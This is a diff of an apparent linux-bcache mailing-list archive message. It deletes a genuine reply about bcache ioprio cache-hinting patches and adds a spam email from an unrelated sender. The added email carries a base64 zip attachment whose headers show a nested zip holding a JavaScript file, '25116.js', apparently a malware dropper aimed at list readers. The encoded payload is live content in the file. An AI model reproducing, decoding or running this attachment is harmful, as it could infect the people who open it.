@@ -1,63 +1,74 @@
-From: Nix <nix@esperi.org.uk>
-Subject: Re: what happened to the nifty ioprio cache hinting stuff?
-Date: Fri, 05 May 2017 22:48:45 +0100
-Message-ID: <874lwzasaq.fsf@esperi.org.uk>
-References: <877f1zil5d.fsf@esperi.org.uk>
-        <20170502201559.5cd65131@jupiter.sol.kaishome.de>
+From: <richard@oxbridgeprograms.com>
+Subject: 62768 linux-bcache
+Date: Sat, 06 May 2017 05:42:36 -0000
+Message-ID: <149404935620.19573.2653284456101819453@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain
+Content-Type: application/zip; name="014203210.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from icebox.esperi.org.uk ([81.187.191.129]:40360 "EHLO
-        mail.esperi.org.uk" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751290AbdEEVss (ORCPT
-        <rfc822;linux-bcache@vger.kernel.org>);
-        Fri, 5 May 2017 17:48:48 -0400
-In-Reply-To: <20170502201559.5cd65131@jupiter.sol.kaishome.de> (Kai Krakow's
-        message of "Tue, 2 May 2017 20:15:59 +0200")
+Received: from 1-168-159-182.dynamic-ip.hinet.net ([1.168.159.182]:50936 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750917AbdEFFmn (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Sat, 6 May 2017 01:42:43 -0400
+Content-Disposition: attachment
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
-To: Kai Krakow <hurikhan77@gmail.com>
-Cc: linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-On 2 May 2017, Kai Krakow said:
-
-> Am Tue, 02 May 2017 11:54:38 +0100
-> schrieb Nix <nix@esperi.org.uk>:
->
->> I found the ioprio cache hinting quite exciting (I know, I'm weird):
->> it won't help with writeback or e.g. NFS, but it will certainly let me
->> do things like run backups without wearing my SSD out.
->
-> I'm certainly waiting for the patches to be upstreamed. Meanwhile, I
-> stopped the hassle of applying the patches and just resorted to putting
-> my backups partition into "write-around" mode. It still gets big
-> improvements in performance and is nice to wear leveling.
-
-I'm running in writearound mode regardless, since my bcache is atop an
-md array, and that array is journalled on the same SSD (for powerfail
-reliability and because in write-back mode it greatly speeds up writes),
-and I don't want to burn the SSD out *that* badly. It still speeds
-things up hugely :)
-
->> This was in ewheeler's for-4.10-block-bcache-updates branch, but it
->> didn't get into 4.10 or 4.11, even while other commits on the same
->> branch did :( is it dead? (I mean, it still seems to *apply* to
->> 4.11...)
->
-> Last time I looked at bitbucket (the only place I found it) to pull the
-> patches via http, it was horribly slow and even complained that the
-> repository is too big to be browsed or generate patch sets.
->
-> Would it be possible to mirror it somewhere else? Bitbucket is really
-> slow for me, direct git-clone didn't even work.
->
-> I was just trying to pull the branch and rebase it ontop of current
-> kernels myself because I couldn't apply these patches. But I eventually
-> gave up due to bitbuckets superior *cough* performance... :-(
-
-It is much faster to take an existing kernel working tree and do a
-
-git remote add ewheeler https://bitbucket.org/ewheelerinc/linux.git
-git remote update ewheeler
-
-since this only needs to get a few hundred KiB of objects.
+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
